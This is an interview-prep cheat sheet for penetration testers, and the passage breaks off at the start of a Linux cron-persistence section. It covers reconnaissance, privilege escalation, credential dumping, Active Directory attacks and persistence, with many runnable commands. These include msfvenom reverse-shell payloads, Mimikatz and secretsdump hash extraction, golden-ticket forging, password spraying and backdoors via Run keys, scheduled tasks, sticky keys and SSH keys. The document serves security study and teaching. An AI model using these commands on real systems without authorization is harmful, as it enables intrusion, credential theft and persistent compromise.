# 🎯 Penetration Testing Interview Answers - Ultimate Cheat Sheet

> **Quick Reference Guide** - Easy to memorize, interview-ready answers

---

## 📚 Quick Navigation

1. [Reconnaissance & OSINT](#reconnaissance--osint)
2. [Initial Access](#initial-access)
3. [Exploitation](#exploitation)
4. [Privilege Escalation](#privilege-escalation)
5. [Credential Access](#credential-access--password-attacks)
6. [Lateral Movement](#lateral-movement)
7. [Active Directory](#active-directory-attacks)
8. [Persistence](#persistence)
9. [Defense Evasion](#defense-evasion)
10. [Web Application Security](#web-application-security)
11. [Cloud Security](#cloud-security)
12. [Network Attacks](#network-attacks)
13. [Wireless Security](#wireless-security)
14. [Mobile Security](#mobile-security)
15. [Container & Kubernetes](#container--kubernetes-security)
16. [ICS/SCADA](#icsscada-security)
17. [IoT & Embedded](#iot--embedded-security)
18. [Social Engineering](#social-engineering)
19. [Physical Security](#physical-security)
20. [Advanced Attacks](#advanced-attacks)
21. [Tools & Frameworks](#tools--frameworks)
22. [Reporting](#reporting--documentation)
23. [Legal & Ethics](#legal--ethics)
24. [Methodology](#methodology--process)
25. [Scenarios](#scenario-based-questions)
26. [Theory & Concepts](#conceptual--theory-questions)

---

## 🔍 Reconnaissance & OSINT

### Subdomain Enumeration

#### Passive vs Active Subdomain Enumeration

| **Passive**                                | **Active**                        |
| ------------------------------------------ | --------------------------------- |
| No direct target contact                   | Direct interaction with target    |
| Certificate logs, search engines, archives | DNS brute-forcing, zone transfers |
| Tools: Amass passive, Subfinder            | Tools: Amass active, MassDNS      |
| Stealthier, OSINT-based                    | Noisier, more complete            |

**Memory Hook**: _"Passive = Stalking from afar, Active = Knocking on doors"_

---

#### Certificate Transparency Logs

- **What**: Public logs of all SSL/TLS certificates
- **Why useful**: Every subdomain with HTTPS appears here
- **Tools**: crt.sh, Censys, `amass intel -d domain.com`
- **Command**: `curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u`

---

#### Tool Comparison: Amass vs Subfinder vs Assetfinder

| Tool            | Speed   | Sources  | Features                            |
| --------------- | ------- | -------- | ----------------------------------- |
| **Amass**       | Slower  | 50+ APIs | Most comprehensive, active+passive  |
| **Subfinder**   | Fast    | 20+ APIs | Quick passive, good API integration |
| **Assetfinder** | Fastest | Limited  | Simple, good for quick checks       |

**Interview Answer**: _"I use Subfinder for quick passive enum, then Amass for comprehensive coverage."_

---

#### DNSgen - How It Works

- **Purpose**: Generate subdomain permutations
- **Method**: Combines existing subdomains with common words
- **Example**: `dev.target.com` → `dev1`, `dev-api`, `dev-test`
- **Pipeline**: `echo dev.target.com | dnsgen - | massdns -r resolvers.txt`

---

#### MassDNS vs dnsx

| MassDNS                        | dnsx                         |
| ------------------------------ | ---------------------------- |
| Raw speed, millions of queries | Smarter, handles rate limits |
| Requires resolver list         | Built-in resolver management |
| Raw output, needs parsing      | Clean output, easy filters   |
| For brute-forcing              | For validation               |

**Use Case**: _"MassDNS for raw enumeration, dnsx for validating discoveries"_

---

#### Validating Live Subdomains

```bash
# Quick validation pipeline
cat subdomains.txt | httpx -status-code -title -tech-detect -o live.txt

# With filtering
cat subdomains.txt | dnsx -silent | httpx -mc 200,301,302,403
```

**Key flags**: `-mc` (match codes), `-fc` (filter codes), `-tech-detect`

---

#### Chaos Data vs SecurityTrails API

| Chaos (ProjectDiscovery) | SecurityTrails         |
| ------------------------ | ---------------------- |
| Free, community-driven   | Premium, comprehensive |
| Bug bounty focused       | Historical DNS data    |
| `chaos -d target.com`    | API key required       |

---

#### Rate-Limited Target Enumeration

1. **Increase delays**: `--delay 5s`
2. **Use passive sources only**: Certificate logs, archives
3. **Distributed scanning**: Multiple IP sources
4. **Off-hours scanning**: Less monitoring
5. **Random subsets**: Don't hit everything at once

---

#### Wildcard DNS Records

- **What**: `*.domain.com` resolves to same IP
- **Problem**: All random strings appear "valid"
- **Detection**: Query random string, check if resolves
- **Solution**: `massdns` auto-detects, `puredns` filters wildcards

**Command**: `echo asdfghjkl.target.com | dnsx -silent` (if resolves = wildcard)

---

#### Subdomain Takeover

**What it is**: Dangling DNS records pointing to unclaimed services
**Vulnerable patterns**:

- CNAME → unclaimed S3 bucket, Heroku, GitHub Pages
- `NXDOMAIN` responses on known service CNAMEs

**Tools**: `subjack`, `nuclei -t takeovers/`

**Quick Check**:

```bash
# Look for CNAME to known vulnerable services
dig subdomain.target.com CNAME
# Check if service is claimable
```

---

### DNS Enumeration

#### DNS Zone Transfer (AXFR)

**What**: Replication mechanism between DNS servers
**Risk**: Leaks ALL DNS records if misconfigured
**Command**:

```bash
dig axfr @ns1.target.com target.com
# Or
dnsrecon -d target.com -t axfr
```

**Fix**: Restrict to authorized secondary servers only

---

#### DNS Zone Walking

**What**: Exploiting NSEC records in DNSSEC
**How**: NSEC reveals all domain names in sorted order
**Tool**: `ldns-walk target.com`
**Modern fix**: NSEC3 uses hashed names

---

#### Valuable DNS Record Types

| Record     | Value                                   |
| ---------- | --------------------------------------- |
| **A/AAAA** | IP addresses                            |
| **MX**     | Mail servers (often internal names)     |
| **TXT**    | SPF, DKIM, verification tokens          |
| **CNAME**  | Service relationships, takeover targets |
| **NS**     | DNS infrastructure                      |
| **SRV**    | Service discovery (Kerberos, LDAP)      |
| **PTR**    | Reverse lookup, internal hostnames      |

---

#### DNSrecon vs DNSenum

| DNSrecon                                   | DNSenum                        |
| ------------------------------------------ | ------------------------------ |
| More features, Python                      | Perl-based, simpler            |
| Zone transfer, brute-force, cache snooping | Zone transfer, Google scraping |
| Better output formatting                   | Faster for basic enum          |

---

#### SPF, DKIM, DMARC Significance

- **SPF**: Lists authorized mail senders → reveals email infrastructure
- **DKIM**: Public key for email signing → reveals mail servers
- **DMARC**: Policy enforcement → misconfig = spoofing opportunity

**Recon value**: Extract IP ranges, mail servers, cloud providers

```bash
dig target.com TXT | grep -E "spf|dkim|dmarc"
```

---

### Port Scanning & Service Detection

#### TCP SYN vs TCP Connect Scan

| SYN Scan (-sS)          | Connect Scan (-sT)         |
| ----------------------- | -------------------------- |
| Half-open, stealthier   | Full TCP handshake         |
| Requires root/admin     | No special privileges      |
| Faster, less logged     | More reliable, more logged |
| Default with privileges | Default without            |

**Memory Hook**: _"SYN = Sneaky, sT = Thorough"_

---

#### Nmap Service Version Detection

- Uses banner grabbing
- Sends service-specific probes
- Compares responses to signature database
- `-sV --version-intensity 5` for aggressive
- Probes stored in `nmap-service-probes`

---

#### Masscan vs Nmap

| Masscan                  | Nmap                 |
| ------------------------ | -------------------- |
| Speed (10M+ packets/sec) | Accuracy, features   |
| Full internet scanning   | Detailed analysis    |
| No service detection     | Service/OS detection |
| Raw packets              | TCP stack            |

**Best Practice**: _"Masscan for discovery, Nmap for deep analysis"_

```bash
masscan -p1-65535 target -oG - | nmap -sV -iL -
```

---

#### RustScan Integration

- Blazing fast port discovery in Rust
- Auto-pipes results to Nmap
- Interactive mode

```bash
rustscan -a target.com -- -sV -sC
# Finds ports fast, then Nmap details
```

---

#### Naabu Advantages

- Built by ProjectDiscovery (Nuclei creators)
- Optimized for modern scanning
- Easy integration with other PD tools
- Handles rate limiting well
- JSON/pipe-friendly output

---

#### Effective UDP Scanning

```bash
# UDP is slow - be selective
nmap -sU --top-ports 100 target

# Important UDP ports
53 (DNS), 67/68 (DHCP), 69 (TFTP),
123 (NTP), 161 (SNMP), 500 (IKE),
1900 (SSDP), 4500 (IPSec)
```

**Challenge**: No response ≠ closed (might be filtered)

---

#### Firewall/IDS Evasion

| Technique     | Command            |
| ------------- | ------------------ |
| Fragmentation | `nmap -f`          |
| Decoys        | `nmap -D RND:10`   |
| Timing        | `nmap -T2`         |
| Source port   | `--source-port 53` |
| MTU           | `--mtu 24`         |
| Idle scan     | `-sI zombie:port`  |

---

#### -sV vs -A Flags

- **-sV**: Version detection only
- **-A**: Aggressive (OS + Version + Scripts + Traceroute)
- **-A** = `-O -sV -sC --traceroute`

**Production tip**: Use `-sV` for speed, `-A` when you need everything

---

#### Scanning /16 Network Efficiently

```bash
# 65,536 hosts - need optimization

# Step 1: Fast host discovery
masscan 10.0.0.0/16 -p80,443,22,445 --rate=10000 -oG alive.txt

# Step 2: Full port scan on live hosts
cat alive.txt | nmap -sV -iL - --top-ports 1000

# Or use Naabu
naabu -host 10.0.0.0/16 -top-ports 1000 | httpx
```

---

#### NSE Script Categories

| Category          | Use Case               |
| ----------------- | ---------------------- |
| **auth**          | Authentication scripts |
| **default** (-sC) | Safe, useful scripts   |
| **discovery**     | Enumerate services     |
| **exploit**       | Exploitation attempts  |
| **vuln**          | Vulnerability checks   |
| **brute**         | Password attacks       |
| **intrusive**     | May crash services     |

```bash
nmap --script=vuln target   # Vulnerability scan
nmap --script=smb* target   # All SMB scripts
```

---

### Web Reconnaissance

#### httpx vs httprobe

| httpx                          | httprobe            |
| ------------------------------ | ------------------- |
| Feature-rich, ProjectDiscovery | Simple, fast        |
| Title, status, tech detection  | Just probe for HTTP |
| JSON output                    | Basic output        |
| Rate limiting built-in         | Minimal features    |

**Answer**: _"httprobe for quick alive check, httpx for detailed info"_

---

#### Aquatone Visual Recon

- Takes screenshots of web pages
- Generates HTML report gallery
- Clusters similar pages
- Identifies tech from visuals

```bash
cat hosts.txt | aquatone -ports 80,443,8080
```

---

#### WAF Detection

**Tools**: wafw00f, whatwaf, nmap http-waf-detect

```bash
wafw00f target.com
# Returns: Cloudflare, AWS WAF, ModSecurity, etc.
```

**Common WAF signatures**:

- Modified headers (Server, X-headers)
- Challenge pages (JavaScript challenges)
- Rate limiting patterns

---

#### Nuclei Templates

- YAML-based vulnerability detection
- Community templates (1000+)
- Fast, parallelized scanning

```bash
nuclei -u target.com -t cves/       # CVE checks
nuclei -u target.com -t takeovers/  # Subdomain takeover
nuclei -u target.com -t exposed-panels/  # Admin panels
```

---

#### Katana vs GoSpider vs Hakrawler

| Tool          | Focus                               |
| ------------- | ----------------------------------- |
| **Katana**    | Next-gen, JS rendering, fast        |
| **GoSpider**  | Fast, concurrent, good for scope    |
| **Hakrawler** | Simple, integrates with other tools |

**Best**: Katana (handles modern JS apps)

---

#### Hidden Parameter Discovery

| Tool            | Method                            |
| --------------- | --------------------------------- |
| **Arjun**       | Brute-force + heuristics          |
| **ParamSpider** | Archives, passive discovery       |
| **x8**          | Smart wordlist, response analysis |

```bash
arjun -u https://target.com/page -oJ params.json
paramspider -d target.com
```

---

#### JavaScript Analysis & Endpoint Extraction

```bash
# Extract JS files
gospider -s https://target.com -d 2 | grep -E "\.js$"

# Analyze JS for endpoints
linkfinder -i https://target.com/app.js -o cli

# Secretfinder for API keys
python3 secretfinder.py -i js_file.js -o cli
```

---

#### ffuf vs Gobuster

| ffuf                        | Gobuster                      |
| --------------------------- | ----------------------------- |
| More flexible, FUZZ keyword | Simpler, purpose-built        |
| POST support, filters       | DNS, dir, vhost modes         |
| Recursion                   | Faster for basic dir busting  |
| Better for fuzzing params   | Better for simple enumeration |

```bash
# ffuf for flexible fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403

# Gobuster for dirs
gobuster dir -u https://target.com -w wordlist.txt
```

---

### OSINT & Intelligence

#### theHarvester Email Enumeration

```bash
theHarvester -d target.com -b all -l 500
# Sources: google, bing, linkedin, twitter, shodan
```

**Extracts**: Emails, subdomains, hosts, employee names

---

#### Shodan vs Censys vs BinaryEdge

| Shodan           | Censys           | BinaryEdge            |
| ---------------- | ---------------- | --------------------- |
| OG, most popular | Academic origins | Newer, good API       |
| IoT focus        | Certificate data | Real-time updates     |
| Good filters     | IPv6 support     | Dataleaks integration |

**Shodan queries**:

```
org:"Target Company"
ssl.cert.subject.cn:"target.com"
http.title:"admin"
```

---

#### GitHub Secrets Enumeration

```bash
# TruffleHog - finds secrets in git history
trufflehog github --org=targetorg

# GitDorker - GitHub dork searches
python3 gitdorker.py -tf token.txt -q target.com

# Gitleaks
gitleaks detect -s ./repo
```

**GitHub Dorks**:

```
org:target password
org:target api_key
org:target secret
filename:.env password
```

---

#### Cloud Asset Enumeration

```bash
# S3 Buckets
aws s3 ls s3://target-backup --no-sign-request

# Azure Blobs
https://<storage>.blob.core.windows.net/<container>

# GCP Buckets
gsutil ls gs://target-bucket

# Tools: cloud_enum, S3Scanner, AzureHound
```

---

## 🚪 Initial Access

### Phishing & Social Engineering

#### Spear Phishing vs Whaling

| Spear Phishing       | Whaling              |
| -------------------- | -------------------- |
| Targeted individuals | Executives/VIPs      |
| Customized pretext   | Business-themed      |
| Research-intensive   | Higher value targets |

---

#### Phishing Payload Types

1. **Macro documents** - Word/Excel with VBA
2. **HTML Smuggling** - JS delivers payload
3. **ISO/IMG files** - Bypass Mark-of-Web
4. **LNK files** - Shortcut execution
5. **OneNote files** - Embedded scripts
6. **QR codes** - Mobile-based attacks

---

#### Email Filter Bypass Techniques

- Use legitimate domains (compromised or lookalike)
- Age new domains before use
- Avoid blacklisted keywords
- Use clean IP reputation
- DKIM/SPF/DMARC aligned
- Link shorteners or redirects
- QR codes instead of links

---

#### Phishing Infrastructure

```
┌─────────────┐    ┌──────────────┐    ┌─────────────┐
│ GoPhish     │───▶│ Landing Page │───▶│ Payload Drop│
│ (Tracking)  │    │ (Evilginx2)  │    │ (File Host) │
└─────────────┘    └──────────────┘    └─────────────┘
         │
         ▼
    ┌──────────┐
    │ SMTP Srv │ (mailgun/sendgrid or self-hosted)
    └──────────┘
```

---

### Password Attacks

#### Password Spraying vs Brute Forcing

| Password Spraying         | Brute Forcing                     |
| ------------------------- | --------------------------------- |
| Few passwords, many users | Many passwords, one user          |
| Avoids lockouts           | Triggers lockouts                 |
| "Password123!" across all | Dictionary against single account |
| Low and slow              | Fast and noisy                    |

---

#### O365 Password Spraying

```bash
# MSOLSpray
python3 MSOLSpray.py -u users.txt -p "Winter2024!" -o sprayed.txt

# Ruler
ruler --domain target.com brute --users users.txt --passwords pass.txt

# Spray intervals: 30-60 min between attempts
```

**Avoid lockouts**: 1-2 passwords per hour, know lockout policy

---

#### Username Enumeration

```bash
# O365
python3 o365enum.py -u users.txt -d target.com

# OWA timing differences
# Check for "password incorrect" vs "user not found"

# Kerbrute for AD
kerbrute userenum -d target.local users.txt
```

---

## 🎯 Exploitation

### Payload Generation

#### Staged vs Stageless Payloads

| Staged                            | Stageless                         |
| --------------------------------- | --------------------------------- |
| Small initial payload             | All-in-one payload                |
| Downloads stage 2                 | Ready to execute                  |
| Evades size limits                | Larger file size                  |
| Requires callback                 | Works offline                     |
| `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |

**Memory Hook**: _"Staged has the slash, needs to call home"_

---

#### msfvenom Payload Generation

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o shell.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf -o shell.elf

# Web shells
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php

# Encoding (basic AV evasion)
msfvenom -p ... -e x86/shikata_ga_nai -i 5 ...
```

---

#### Shikata Ga Nai Encoding

- **What**: Polymorphic XOR encoder
- **How**: Each generation creates different bytecode
- **Reality**: Most AV detects it now
- **Better**: Custom encoding, AMSI bypass, reflective loading

---

#### Web Shell vs Reverse Shell

| Web Shell              | Reverse Shell             |
| ---------------------- | ------------------------- |
| Accessed via HTTP      | Connects back to attacker |
| Persistent if uploaded | Session-based             |
| Limited to web context | Full shell access         |
| Easy detection         | Needs egress              |

---

### Shell Upgrades

#### Upgrading to Interactive TTY

```bash
# Python method (most common)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background, configure terminal
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120

# Alternative with script
script /dev/null -c bash
```

---

#### pty Spawning Importance

- Enables arrow keys, tab completion
- Allows Ctrl+C without killing shell
- Required for su/sudo/ssh
- Proper job control

---

#### Shell Stabilization Checklist

1. Spawn PTY (`python3 -c 'import pty...'`)
2. Background shell (`Ctrl+Z`)
3. Set terminal (`stty raw -echo; fg`)
4. Export TERM (`export TERM=xterm-256color`)
5. Set dimensions (`stty rows X cols Y`)
6. Use rlwrap for history (`rlwrap nc -lvnp 4444`)

---

## ⚡ Privilege Escalation

### Windows Priv Esc

#### Quick Enumeration Commands

```powershell
# Current user
whoami /all

# System info
systeminfo

# Running tools
winpeas.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

---

#### Unquoted Service Paths

**Vuln**: Service path without quotes, spaces in path

```
C:\Program Files\My App\service.exe
# Windows tries:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe
```

**Exploit**:

```bash
# Find vulnerable services
wmic service get name,pathname | findstr /i /v "C:\Windows"

# Place malicious exe
copy evil.exe "C:\Program Files\My.exe"
# Restart service
```

---

#### Weak Service Permissions

**Check**: Can you modify service binary or config?

```powershell
# Check with accesschk
accesschk.exe /accepteula -uwcqv "Users" *

# Find modifiable services
Get-ServiceAcl | Where {$_.AccessToString -match "Modify|FullControl"}
```

**Exploit**:

```cmd
sc config vulnservice binpath= "C:\evil.exe"
sc stop vulnservice
sc start vulnservice
```

---

#### AlwaysInstallElevated

**What**: MSI packages run as SYSTEM
**Check**:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1
```

**Exploit**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

#### DLL Hijacking

**Concept**: Application loads DLL from writable location
**Find**: Process Monitor, check for "NAME NOT FOUND" in DLL loads
**Exploit**: Place malicious DLL in searched path

Common locations:

1. Application directory
2. Current directory
3. System32
4. Windows
5. PATH directories

---

#### Potato Attacks (SeImpersonatePrivilege)

| Attack           | When to Use                  |
| ---------------- | ---------------------------- |
| **JuicyPotato**  | Old Windows (before 2019)    |
| **RoguePotato**  | Post JuicyPotato patches     |
| **PrintSpoofer** | Windows 10/Server 2019+      |
| **GodPotato**    | Modern, most reliable        |
| **SweetPotato**  | Combines multiple techniques |

**Requirement**: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

```cmd
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

---

#### WinPEAS Checklist

- Stored credentials
- Unquoted paths
- Weak permissions
- AlwaysInstallElevated
- Token privileges
- Scheduled tasks
- AutoRun programs
- Network info
- Installed software

---

### Linux Priv Esc

#### LinPEAS Categories

1. System Information
2. User Information
3. Environmental Info
4. Software Information
5. Processes & Cron
6. Network Info
7. Services
8. Containers
9. Possible Privesc Vectors

---

#### SUID Binary Exploitation

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check GTFOBins for exploitation
# Example: SUID find
find . -exec /bin/bash -p \; -quit

# Example: SUID vim
vim -c ':!/bin/bash'
```

---

#### Linux Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities
cap_setuid           # Can set UID
cap_dac_override     # Bypass file permissions
cap_net_raw          # Raw sockets
```

**Exploit**:

```bash
# Python with cap_setuid
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

---

#### Sudo Misconfigurations

```bash
sudo -l  # Check sudo rights

# GTFOBins examples:
sudo vim -c ':!/bin/bash'
sudo less /etc/passwd  # then !sh
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find / -exec /bin/bash \; -quit
```

---

#### GTFOBins Usage

**Website**: gtfobins.github.io
**Categories**:

- Shell
- Command
- Reverse Shell
- File Upload/Download
- SUID
- Sudo
- Capabilities

---

#### Cron Job Privesc

```bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Find writable scripts in cron
find /etc/cron* -writable 2>/dev/null

# Common exploits:
# 1. Modify script run by root
# 2. PATH hijacking
# 3. Wildcard injection
```

---

#### Wildcard Injection

**Example**: tar with wildcard in cron

```bash
# Cron runs: cd /tmp; tar czf backup.tar.gz *

# Create malicious files
echo "" > "/tmp/--checkpoint=1"
echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"
echo "chmod +s /bin/bash" > /tmp/shell.sh
```

---

#### Docker Group Privilege Escalation

```bash
# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Or
docker run -v /etc/passwd:/host/passwd -it alpine
```

---

## 🔐 Credential Access & Password Attacks

### Windows Credential Dumping

#### LSASS Memory Dumping

**What**: Local Security Authority Subsystem stores credentials
**Methods**:

```powershell
# Mimikatz (interactive)
privilege::debug
sekurlsa::logonpasswords

# Procdump (signed Microsoft tool)
procdump -ma lsass.exe lsass.dmp

# Comsvcs.dll (LOLBin)
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full
```

---

#### SAM/SYSTEM/SECURITY Extraction

```cmd
# Copy from registry
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SECURITY security.bak

# From shadow copies
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .

# Extract with secretsdump
secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL
```

---

#### NTDS.dit Extraction

**What**: AD database with all domain password hashes

```powershell
# Using ntdsutil
ntdsutil "ac in ntds" "ifm" "cr fu C:\temp\ntds" q q

# Using vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

---

#### DCSync Attack

**What**: Replicate password data from DC (like a DC does)
**Requirements**: Replicating Directory Changes + Replicating Directory Changes All
**Usually**: Domain Admins, DC accounts, custom delegations

```powershell
# Mimikatz
lsadump::dcsync /domain:target.local /user:Administrator

# Secretsdump
secretsdump.py target.local/user:password@dc.target.local -just-dc
```

---

### Mimikatz Deep Dive

#### Key Commands

```powershell
# Get debug privilege (required)
privilege::debug

# Dump logon passwords
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# DCSync
lsadump::dcsync /user:krbtgt

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:target /ntlm:hash /run:cmd

# Golden Ticket
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /id:500

# Export tickets
sekurlsa::tickets /export
```

---

#### Golden vs Silver Ticket

| Golden Ticket          | Silver Ticket              |
| ---------------------- | -------------------------- |
| Uses krbtgt hash       | Uses service account hash  |
| Forges TGT             | Forges TGS                 |
| Access to anything     | Access to specific service |
| Valid 10 years default | Limited to service         |
| Needs krbtgt hash      | Needs service hash         |

---

### Password Cracking

#### Hashcat vs John

| Hashcat                    | John the Ripper         |
| -------------------------- | ----------------------- |
| GPU-accelerated            | CPU-focused             |
| Faster for large wordlists | Better rule flexibility |
| More hash types            | Good for single cracks  |
| Windows binaries           | Cross-platform          |

---

#### Common Hashcat Modes

```bash
-m 0     # MD5
-m 100   # SHA1
-m 1000  # NTLM
-m 1800  # SHA512crypt (Linux)
-m 3200  # bcrypt
-m 5600  # NetNTLMv2
-m 13100 # Kerberoast (TGS-REP)
-m 18200 # AS-REP Roast
```

---

#### Hashcat Attack Modes

```bash
-a 0  # Dictionary
-a 1  # Combinator
-a 3  # Mask/Brute-force
-a 6  # Dictionary + Mask
-a 7  # Mask + Dictionary

# Examples
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d
```

---

## 🔄 Lateral Movement

### Pass-the-Hash

#### Why PTH Works

- Windows caches NTLM hashes for authentication
- Hash IS the credential (no password needed)
- NTLM doesn't require plaintext password

**Tools**:

```bash
# CrackMapExec
crackmapexec smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:hash

# Impacket
psexec.py -hashes :hash admin@target
wmiexec.py -hashes :hash admin@target

# Evil-WinRM
evil-winrm -i target -u admin -H hash

# Mimikatz
sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:cmd
```

---

### Remote Execution Comparison

| Method      | Port | LOLBin          | Traces           |
| ----------- | ---- | --------------- | ---------------- |
| **PSExec**  | 445  | Creates service | Service creation |
| **WMIExec** | 135  | WMI             | Less logging     |
| **SMBExec** | 445  | No binary drop  | Service creation |
| **AtExec**  | 445  | Task Scheduler  | Scheduled task   |
| **DCOM**    | 135  | Various         | Varies           |

```bash
# Impacket examples
psexec.py domain/user:pass@target
wmiexec.py domain/user:pass@target
smbexec.py domain/user:pass@target
atexec.py domain/user:pass@target "command"
```

---

### SMB Relay

**What**: Forward captured NTLM auth to another host
**Requirements**: SMB Signing must be disabled/not required

```bash
# Check signing
crackmapexec smb targets.txt --gen-relay-list relay_targets.txt

# Perform relay
ntlmrelayx.py -tf relay_targets.txt -smb2support

# Trigger with Responder (disable SMB/HTTP servers)
responder -I eth0 -dwF
```

---

## 🏰 Active Directory Attacks

### AD Enumeration

#### PowerView Key Functions

```powershell
# Import
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users & Groups
Get-DomainUser -SPN                    # Kerberoastable
Get-DomainUser -PreauthNotRequired     # AS-REP roastable
Get-DomainGroup -AdminCount            # Protected groups
Get-DomainGroupMember "Domain Admins"

# Computers
Get-DomainComputer | select dnshostname

# ACLs
Find-InterestingDomainAcl
Get-ObjectAcl -SamAccountName "Domain Admins"

# Shares
Find-DomainShare -CheckShareAccess

# GPO
Get-DomainGPO
```

---

#### BloodHound Usage

```bash
# Collection with SharpHound
SharpHound.exe -c All

# Or PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Linux collector
bloodhound-python -d target.local -u user -p pass -c All -ns dc_ip
```

**Key Queries**:

- Shortest Path to Domain Admin
- Kerberoastable Users
- Users with DCSync Rights
- Principals with Unconstrained Delegation

---

### Kerberos Attacks

#### Kerberoasting

**What**: Request TGS tickets for SPNs, crack offline

```bash
# Find SPNs
GetUserSPNs.py target.local/user:pass -dc-ip 10.10.10.10

# Request tickets
GetUserSPNs.py target.local/user:pass -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# Crack
hashcat -m 13100 tgs.txt rockyou.txt
```

---

#### AS-REP Roasting

**What**: Request AS-REP without preauth, crack offline
**Target**: Users with "Do not require Kerberos preauthentication"

```bash
# Find targets
GetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10

# Request and crack
GetNPUsers.py target.local/user -no-pass -dc-ip 10.10.10.10 -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

---

#### Unconstrained Delegation

**What**: Service can impersonate ANY user to ANY service
**Risk**: If compromised, extracts cached TGTs

```powershell
# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Coerce authentication (Printer Bug)
SpoolSample.exe dc.target.local attacker-uncon.target.local

# Capture TGT with Rubeus
Rubeus.exe monitor /interval:5
```

---

#### Constrained Delegation Abuse

```bash
# Find constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U attack with Impacket
getST.py -spn cifs/target.local -impersonate Administrator target.local/svc_account -hashes :hash

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.local
```

---

#### Golden Ticket Creation

```powershell
# Need krbtgt hash and domain SID
kerberos::golden /user:FakeAdmin /domain:target.local /sid:S-1-5-21-XXX /krbtgt:HASH /id:500 /ptt

# Or with Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain target.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
```

---

### ACL Abuse

#### Dangerous Permissions

| Right                   | Abuse                                       |
| ----------------------- | ------------------------------------------- |
| **GenericAll**          | Full control - reset password, add to group |
| **GenericWrite**        | Modify attributes - SPN, scripts            |
| **WriteOwner**          | Take ownership, then GenericAll             |
| **WriteDacl**           | Modify ACL, grant GenericAll                |
| **ForceChangePassword** | Reset password without knowing old          |
| **AddMember**           | Add to groups                               |

```powershell
# Example: Add to group with GenericAll
net group "Domain Admins" compromised_user /add /domain

# Change password
net user target_user NewPassword123! /domain
```

---

## 💾 Persistence

### Windows Persistence

#### Registry Autorun Keys

```cmd
# Current User
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Local Machine (admin)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Add persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\evil.exe"
```

---

#### Scheduled Task Persistence

```cmd
schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru SYSTEM

# PowerShell
$action = New-ScheduledTaskAction -Execute "C:\evil.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
```

---

#### Sticky Keys Backdoor

```cmd
# Replace accessibility binaries
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

# Trigger: Press Shift 5 times at login screen
```

---

### Linux Persistence

#### SSH Key Persistence

```bash
# Add your public key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Connect
ssh -i private_key root@target
```

---

#### Cron Persistence

```bash
# Add to crontab
